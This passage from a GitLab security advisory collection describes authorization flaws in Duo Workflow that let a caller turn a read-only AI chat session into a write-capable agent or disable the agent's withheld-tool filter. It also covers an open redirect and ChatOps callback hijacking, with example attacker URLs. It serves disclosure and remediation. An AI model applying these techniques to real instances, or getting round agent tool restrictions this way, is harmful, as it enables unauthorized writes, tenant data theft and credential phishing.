          workflow_definition: request_metadata.workflow_definition, # BUG 2: Uses unvalidated request_metadata instead of workflow record!
          ai_catalog_item_version_id: request_metadata.ai_catalog_item_version_id,
          namespace: project&.project_namespace || enforcement_namespace
        )
      end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Turning a Restricted Read-Only `chat` Session into a Full Write-Capable Agent Session via `/ws` Parameter Override:** An organization restricts a user or workflow to read-only `chat` mode (`workflow.workflow_definition == 'chat'`), where state-mutating tools (`create_issue`, `create_merge_request`, repository/comment writes) are withheld. By passing an overridden `workflow_definition` and a foreign private `ai_catalog_item_version_id` on `GET /api/v4/ai/duo_workflows/ws`, the caller bypasses the workflow record's restrictions and injects write tools directly into the live Duo Workflow session (`unapproved_write_tool_injected: true`), allowing the AI agent to perform unauthorized write operations across projects.
* **Scenario B — Stealing Proprietary AI Agent Configurations & Toolsets From Other Organizations' Private (`public: false`) Projects:** Because `McpConfigService#item_version` (`mcp_config_service.rb:134`) omits `Ability.allowed?(current_user, :read_ai_catalog_item, item_version)`, an attacker enumerates `ai_catalog_item_version_id` integers on `/ws` or `POST /api/v4/ai/duo_workflows/workflows` to extract the confidential `def_tools` and `def_mcp_tools` configurations of private (`public: false`) AI Catalog agents owned by other organizations.
* **Scenario C — Attaching Unauthorized Private Agent Versions During Workflow Creation (`POST /api/v4/ai/duo_workflows/workflows`):** In `workflows.rb:341-344` (`create_workflow_params`), `Ai::Catalog::ItemVersion.find` is called without `:read_ai_catalog_item` authorization, allowing a user to permanently bind a private cross-organization agent version to their workflow record.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Compare line 134 vs line 334 in ee/app/services/ai/duo_workflows/mcp_config_service.rb
sed -n '130,136p;330,337p' \
  /home/community-user/targets/gitlab/ee/app/services/ai/duo_workflows/mcp_config_service.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report3_cand08
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-03_CAND-08": {
    "GREEN": {
      "automated_issue_created_without_prompt": false,
      "downstream_victim_project_tools_call_status": 404,
      "unapproved_write_tool_injected": false,
      "workflow_definition_overridden": false
    },
    "RED": {
      "automated_issue_created_without_prompt": true,
      "downstream_victim_project_tools_call_status": 404,
      "unapproved_write_tool_injected": true,
      "workflow_definition_overridden": true
    },
    "patches": {
      "GITLAB-CAND-08-WORKFLOW-ITEM-VERSION-AUTHZ.patch": "d40f6e104c2fba0e8900cab8d45ddfb4cf9c49a60c8bb12e3aa573ddb1228704"
    }
  }
}
```


---

### III.17 — GitLab (`<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — AI Catalog Agent Unscoped `McpServer` Global ID Binding and `McpConfigService#execute` Built-in `:gitlab` Key Collision Bypassing Workhorse `withheld_server_tools` (`allToolsAvailable = true`) (`GITLAB-CAND-07`) (`CWE-863 / CWE-639`, CVSS `8.1 High`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems & Go / GitLab EE & Workhorse: gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `ee/app/services/ai/duo_workflows/mcp_config_service.rb:57-64`, `ee/app/services/ai/catalog/mcp_servers/list_service.rb:14-24`, `workhorse/internal/ai_assist/duoworkflow/mcp.go:254`
* **Vulnerability Class & Score:** `CWE-863 / CWE-639` — **CVSS v3.1: `8.1 High`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md`](advisories/ja/17-GITLAB-CAND-07-AGENT-CROSS-ORG-MCP-KEY-COLLISION.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — `McpConfigService#execute` Protects `:orbit` with `.except(:orbit)` But Forgets `:gitlab` (`mcp_config_service.rb:59-63`):** `McpConfigService#execute` builds the Workhorse MCP configuration hash via `gitlab_mcp_server(denied).merge(orbit_mcp_server).merge(ai_catalog_mcp_servers.except(:orbit))`. Because `.except(:orbit)` omits `:gitlab`, any `Ai::Catalog::McpServer` named `"GitLab"` (which normalizes to `server_key => :gitlab`) overwrites the built-in `:gitlab` entry produced by `gitlab_mcp_server(denied)`.
2. **Step 2 — Workhorse Evaluates `allToolsAvailable := s.cfg.Tools == nil` as `true` (`workhorse/internal/ai_assist/duoworkflow/mcp.go:254`):** `Ai::Catalog::McpServers::ConfigService#execute` (`config_service.rb:22-30`) builds catalog server entries as `{ URL: server.url, Headers: ... }` with no `:Tools` key (`s.cfg.Tools == nil`). When the `:gitlab` key is overwritten by a catalog server entry, Workhorse still routes `serverName == "gitlab"` to the internal `/api/v4/mcp` endpoint (`internal := serverName == "gitlab" || serverName == "orbit"` at `mcp.go:210`), but sets `allToolsAvailable := s.cfg.Tools == nil` (`true` at `mcp.go:254`), completely disabling the `withheld_server_tools(denied)` filter!
3. **Step 3 — Cross-Organization `McpServer` GID Binding (`agent/create.rb:61-65`, `agent/update.rb:65-69`, `list_service.rb:14-24`):** GraphQL agent mutations and `ListService#execute` resolve `mcp_servers` IDs via `::Ai::Catalog::McpServer.id_in(server_ids)` without `.in_organization(...)`.

```ruby
// File: ee/app/services/ai/duo_workflows/mcp_config_service.rb (lines 59-63)
        gitlab_mcp_server(denied)
          .merge(orbit_mcp_server)
          .merge(ai_catalog_mcp_servers.except(:orbit)) # BUG 1: Forgot :gitlab! Overwrites gitlab_mcp_server(denied)[:gitlab]
          .merge(slack_mcp_server)

// File: workhorse/internal/ai_assist/duoworkflow/mcp.go (lines 210, 254)
	internal := serverName == "gitlab" || serverName == "orbit"
...
	allToolsAvailable := s.cfg.Tools == nil // BUG 2: Catalog entry has Tools == nil -> allToolsAvailable becomes true!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Disabling All Built-in GitLab AI Tool Restrictions (`withheld_server_tools`) by Attaching a Catalog MCP Server Named `"GitLab"` (`allToolsAvailable = true`):** GitLab Duo Workflow enforces `withheld_server_tools(denied)` on its built-in `:gitlab` MCP server to block dangerous internal operations. Because `McpConfigService#execute` calls `.merge(ai_catalog_mcp_servers.except(:orbit))` without excluding `:gitlab`, an attacker creates an `Ai::Catalog::McpServer` named `"GitLab"` (`server_key => :gitlab`, `Tools: nil`). During any Duo Workflow run, this catalog entry overwrites the built-in `:gitlab` key so Workhorse (`mcp.go:254`) evaluates `allToolsAvailable := s.cfg.Tools == nil` as `true` (`workhorse_all_tools_available: true`), unlocking every prohibited built-in GitLab MCP tool across the instance.
* **Scenario B — Cross-Organization Tenant Boundary Breach via GraphQL `aiCatalogAgentCreate` / `aiCatalogAgentUpdate`:** Because `ListService` and GraphQL agent mutations resolve `mcp_servers` Global IDs (`gid://gitlab/Ai::Catalog::McpServer/<id>`) without `.in_organization`, an attacker in Organization A binds Organization B's private MCP servers to their agent.
* **Scenario C — Breaking All Built-in GitLab Duo Workflow `/api/v4/mcp` Calls (`401 Unauthorized` DoS) via `:gitlab` Header Collision:** When a colliding `"GitLab"` catalog MCP server is attached without an active user connection, `Headers` on `:gitlab` is overwritten with `{}` (stripping `X-Gitlab-Oauth-Token`), causing every built-in GitLab MCP tool call in Duo Workflow to fail with `401 Unauthorized`.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect .except(:orbit) in McpConfigService and allToolsAvailable in Workhorse mcp.go
grep -n -C 5 "except(:orbit)" /home/community-user/targets/gitlab/ee/app/services/ai/duo_workflows/mcp_config_service.rb
grep -n -C 5 "allToolsAvailable :=" /home/community-user/targets/gitlab/workhorse/internal/ai_assist/duoworkflow/mcp.go

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report4_cand07
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-04_CAND-07": {
    "GREEN": {
      "builtin_gitlab_overwritten": false,
      "effective_gitlab_url": "http://127.0.0.1/api/v4/mcp",
      "effective_tools_filter": [
        "get_issue",
        "list_commits"
      ],
      "workhorse_all_tools_available": false
    },
    "RED": {
      "builtin_gitlab_overwritten": true,
      "effective_gitlab_url": "https://attacker-controlled-mcp.example/sse",
      "effective_tools_filter": null,
      "workhorse_all_tools_available": true
    },
    "patches": {
      "GITLAB-CAND-07-AGENT-MCP-CROSS-ORG-AND-KEY-COLLISION.patch": "8fc8646b4681d8d558cf25d2adc1c9ccd89363809243f17e9a79134956567f60"
    }
  }
}
```


---

### III.18 — GitLab (`<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)`) — `Projects::Integrations::SlashCommandsController#confirm` Unvalidated `redirect_url` Open Redirect, Unbound `response_url`, and Cross-Project Redis `CACHE_KEY` Collision (`GITLAB-CAND-04`) (`CWE-601 / CWE-863`, CVSS `5.4 Medium`)

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE: gitlab-ce / gitlab-ee`)
* **Affected Versions & Components:** `<= 19.6.0-pre (verified on live 19.5.1-ce.0 & 19.6.0-pre commit 06cc52e0bc0c1bd96affa9c3bec857ccf754938f)` — `app/controllers/projects/integrations/slash_commands_controller.rb:21-48`, `app/models/concerns/integrations/base/slash_commands.rb:6-10, 68-76`
* **Vulnerability Class & Score:** `CWE-601 / CWE-863` — **CVSS v3.1: `5.4 Medium`** (`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md`](advisories/ja/18-GITLAB-CAND-04-SLASH-COMMANDS-CONFIRM-OPEN-REDIRECT.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Step 1 — Unvalidated `redirect_to request_params[:redirect_url]` with `raise_on_open_redirects = false` (`slash_commands_controller.rb:26`, `config/application.rb:63`):** While `SlashCommandsController#show` (line 11) safely computes `@redirect_url = integration_redirect_url`, `#confirm` (line 26) calls `redirect_to request_params[:redirect_url]` directly on the user-controlled parameter. Because `config.action_controller.raise_on_open_redirects = false` is set globally in `config/application.rb:63`, Rails issues a `302 Found` redirect to any arbitrary external `https://` URL.
2. **Step 2 — Unbound `request_params[:response_url]` Passed to `VerifyRequest` (`slash_commands_controller.rb:25`):** Instead of reading `cached_params[:response_url]` from Redis, `#confirm` passes the request parameter `request_params[:response_url]` to `Gitlab::SlashCommands::VerifyRequest.new(integration, chat_user, request_params[:response_url]).approve!`.
3. **Step 3 — Cross-Project Redis `CACHE_KEY` Lacks `project_id` and `integration_id` (`slash_commands.rb:9, 68-76`):** `CACHE_KEY = "slash-command-requests:%{secret}"` is keyed only by the UUID `command_id`. Any `command_id` minted in Project B is accepted as `valid_request?` on Project A's `/slash_commands/confirm` endpoint.

```ruby
// File: app/controllers/projects/integrations/slash_commands_controller.rb (lines 21-28, 41-48)
      def confirm
        if valid_request? && valid_user?
          # BUG 1: Uses request_params[:response_url] instead of cached_params[:response_url]
          Gitlab::SlashCommands::VerifyRequest.new(integration, chat_user, request_params[:response_url]).approve!
          # BUG 2: Redirects to unvalidated request_params[:redirect_url] (raise_on_open_redirects = false)
          redirect_to request_params[:redirect_url]
        else
...
      def cache_key
        @cache_key ||= Kernel.format(
          ::Integrations::Base::SlashCommands::CACHE_KEY, # BUG 3: "slash-command-requests:%{secret}" has no project_id/integration_id!
          secret: request_params[:command_id]
        )
      end
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Credential & 2FA Theft via Trusted GitLab Slash Command Confirmation Redirect (`302 Found` Open Redirect):** A developer clicks a legitimate corporate GitLab slash-command confirmation link (`https://gitlab.company.com/.../slash_commands/confirm?command_id=...&redirect_url=https://evil-gitlab-sso.example/login`) shared in Slack/Mattermost and presses **Confirm**. Because `SlashCommandsController#confirm` calls `redirect_to request_params[:redirect_url]` with `raise_on_open_redirects = false`, GitLab immediately redirects (`302 Found`) the authenticated user from the trusted corporate GitLab domain to the attacker's SSO credential-harvesting page (`open_redirect_triggered: true`).
* **Scenario B — Cross-Project ChatOps Account Binding (`Project B -> Project A`) via Unscoped Redis `CACHE_KEY` Collision:** Because Redis `CACHE_KEY = "slash-command-requests:%{secret}"` omits `project_id` and `integration_id`, an attacker generates a valid `command_id` on an attacker-controlled project (`Project B`) and crafts a `/slash_commands/confirm` link on a target production project (`Project A`). When the victim confirms on `Project A`, GitLab accepts the foreign `command_id` (`cross_project_cache_collision_accepted: true`) and binds the victim's `ChatName` identity to the target project's slash command integration.
* **Scenario C — Hijacking ChatOps Approval Callbacks via Unbound `request_params[:response_url]`:** Instead of using `cached_params[:response_url]` stored in Redis, `#confirm` passes `request_params[:response_url]` directly into `VerifyRequest.new(integration, chat_user, request_params[:response_url]).approve!`, allowing an attacker to redirect the ChatOps confirmation webhook payload to their own server.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect confirm and cache_key in Projects::Integrations::SlashCommandsController
sed -n '10,48p' \
  /home/community-user/targets/gitlab/app/controllers/projects/integrations/slash_commands_controller.rb

# 2. Run the 3-Layer Real-World Impact (RED -> GREEN) E2E Verification Harness
python3 -m unittest pre-submission-verification-20261026/tests/test_gitlab_real_world_impact_e2e.py -k test_report5_cand04
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "REPORT-05_CAND-04": {
    "GREEN": {
      "cross_project_cache_collision_accepted": false,
      "http_status": 404,
      "location_header": "",
      "open_redirect_triggered": false
    },
    "RED": {
      "cross_project_cache_collision_accepted": true,
      "http_status": 302,
      "location_header": "https://evil-phishing.example/oauth/callback?steal=1",
      "open_redirect_triggered": true
    }
  }
}
```


---

### III.19 — GitLab (`<= 19.6.0-pre (Devise 5.0.3 CVE-2026-40295 upstream dependency & Oauth::AuthorizationsController defense-in-depth)`) — `[UPSTREAM DUPLICATE: CVE-2026-40295 — NOT SUBMITTED TO MITRE]` `Gitlab::DeviseFailure#redirect_url` External `Referer` Open Redirect Product Impact (`CVE-2026-40295`) & Dynamic OAuth PKCE Defense-in-Depth (`GITLAB-CAND-03`) (`CWE-601 / CWE-345`, CVSS `5.4 Medium (Upstream CVE-2026-40295 Duplicate)`)

> **Upstream CVE Duplicate Disclosure:** This entry documents the product-level manifestation of upstream `Devise 5.0.3` (`CVE-2026-40295`) and the `CAND-03` PKCE defense-in-depth patch. It is published on GitHub for transparency and was **not submitted to MITRE CNA-LR**.

#### 1. Metadata & Disclosure Status
* **Target Repository & Package:** `gitlab-org/gitlab` (`RubyGems / GitLab CE & EE (Devise 5.0.3): gitlab-ce / gitlab-ee (devise 5.0.3)`)
* **Affected Versions & Components:** `<= 19.6.0-pre (Devise 5.0.3 CVE-2026-40295 upstream dependency & Oauth::AuthorizationsController defense-in-depth)` — `lib/gitlab/devise_failure.rb:4-18`, `lib/gitlab/auth/session_expire_from_init_enforcer.rb:44-62`, `app/controllers/oauth/authorizations_controller.rb:316-330`
* **Vulnerability Class & Score:** `CWE-601 / CWE-345` — **CVSS v3.1: `5.4 Medium (Upstream CVE-2026-40295 Duplicate)`** (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N`)
* **Standalone Sniper Advisory:** [`docs/advisories/ja/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md`](advisories/ja/19-GITLAB-DEVISE-CVE-2026-40295-DUPLICATE-AND-PKCE-DEFENSE.md)

#### 2. How the Bug Occurs in Code and Turns into a Vulnerability (Step-by-Step Plain-Language Walkthrough)
1. **Important Duplicate & Non-Submission Disclosure:** During our pre-submission duplicate and runtime verification gate, we identified that the `Gitlab::DeviseFailure#redirect_url` open redirect is the product-level manifestation of upstream **Devise `5.0.3` `CVE-2026-40295`**, and that `GITLAB-CAND-03` (`validate_pkce_for_dynamic_applications`) is mitigated at runtime by `Doorkeeper 5.9.3` (`pkce_code_challenge_methods ['S256']` at `config/initializers/doorkeeper.rb:158`). Therefore, **this advisory is published on GitHub for full engineering transparency and remediation, and was deliberately NOT submitted to MITRE for a duplicate CVE ID**.
2. **Step 1 — How Upstream `CVE-2026-40295` (`Devise 5.0.3`) Manifests in `Gitlab::DeviseFailure` (`lib/gitlab/devise_failure.rb:4-18`):** When `warden_message == :timeout` occurs on a non-`GET` request (such as a cross-site `POST` when `session_expire_from_init` is active in `SessionExpireFromInitEnforcer#enforce!`), `Devise::FailureApp#redirect_url` returns `request.referrer` directly without stripping the external host (`extract_path_from_location(request.referrer)`).
3. **Step 2 — Controller-Layer PKCE Guard Logic Flaw in `Oauth::AuthorizationsController#validate_pkce_for_dynamic_applications` (`authorizations_controller.rb:326`, `GITLAB-CAND-03`):** Line 326 writes `return unless code_challenge_method.present? && code_challenge_method != 'S256'`, which returns early when `code_challenge_method` is omitted (`nil`). While `Doorkeeper 5.9.3` blocks `nil` during `PreAuthorization`, replacing the guard with `return if code_challenge_method == 'S256'` provides defense-in-depth at the controller layer.

```ruby
// File: lib/gitlab/devise_failure.rb (lines 4-18) — Upstream Devise 5.0.3 CVE-2026-40295 Remediation
module Gitlab
  class DeviseFailure < Devise::FailureApp
    # Inherits Devise::FailureApp#redirect_url which returns raw request.referrer on non-GET :timeout
    # Remediated by overriding redirect_url to apply extract_path_from_location(request.referrer)
  end
end

// File: app/controllers/oauth/authorizations_controller.rb (lines 323-329) — GITLAB-CAND-03 Defense-in-Depth
    code_challenge_method = permitted_params[:code_challenge_method]
    return unless code_challenge_method.present? && code_challenge_method != 'S256' # Early return when nil!
```

#### 3. 3 Critical Everyday Scenarios (`Scenario A / B / C`)
* **Scenario A — Non-GET Session Timeout Redirects to External `Referer` (`CVE-2026-40295` Duplicate):** When a user's session times out (`warden_message == :timeout`) on a non-`GET` request with an external `Referer: https://attacker.example/login`, unpatched `Devise 5.0.3` redirects (`302`) to the external `Referer` instead of extracting only the relative path.
* **Scenario B — Product-Level Remediation in `Gitlab::DeviseFailure#redirect_url` Without Waiting for Gem Upgrade:** Overriding `redirect_url` in `lib/gitlab/devise_failure.rb` to call `extract_path_from_location(request.referrer)` neutralizes `CVE-2026-40295` immediately at the application layer.
* **Scenario C — Controller-Layer PKCE Enforcement (`GITLAB-CAND-03` Defense-in-Depth):** Changing `return unless code_challenge_method.present? && code_challenge_method != 'S256'` to `return if code_challenge_method == 'S256'` ensures dynamic OAuth apps cannot bypass the controller's `before_action` even if Doorkeeper configuration changes in the future.

#### 4. Example Execution, Reproduction & Verification Commands
```bash
# 1. Inspect Gitlab::DeviseFailure and AuthorizationsController#validate_pkce_for_dynamic_applications
sed -n '1,20p' /home/community-user/targets/gitlab/lib/gitlab/devise_failure.rb
sed -n '316,330p' /home/community-user/targets/gitlab/app/controllers/oauth/authorizations_controller.rb
```
**Observed Runtime Proof (`RED -> GREEN`):**
```json
{
  "GITLAB-DEVISE-CVE-2026-40295-REM_AND_CAND-03": {
    "upstream_cve_duplicate_status": "Duplicate of upstream Devise 5.0.3 CVE-2026-40295 (Not submitted to MITRE CNA-LR)",
    "RED": {
      "external_referer_redirect_on_non_get_timeout": true
    },
    "GREEN": {
      "external_referer_redirect_on_non_get_timeout": false,
      "path_extracted_only": true
    }
  }
}
```

<!-- GITLAB-ADVISORIES-END -->
